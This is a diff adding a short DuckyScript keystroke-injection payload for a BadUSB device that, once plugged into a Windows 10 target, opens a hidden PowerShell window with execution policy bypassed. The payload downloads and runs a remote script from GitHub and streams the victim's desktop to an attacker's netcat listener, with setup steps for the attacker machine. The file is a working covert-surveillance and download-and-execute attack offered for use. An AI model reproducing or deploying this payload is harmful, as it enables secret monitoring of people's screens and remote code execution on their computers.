@@ -1,0 +1,20 @@
+REM Title: Beigeworm's Screenshare Through Netcat 
+REM Author: @beigeworm
+REM Description: This script connects target computer with a netcat session to send a stream of the desktop to a browser window.
+REM Target: Windows 10
+
+REM *SETUP*
+REM replace YOUR_IP_HERE with your netcat attacker IP Address.
+REM Run script on target Windows system.
+REM On a Linux box use this command > nc -lvnp 9000 | nc -lvnp 8080 (Netcat is required)
+REM Then in a firefox browser on the Linux box > http://localhost:8080
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $ip='YOUR_IP_HERE'; irm https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Netcat-Screenshare/main.ps1 | iex
+ENTER
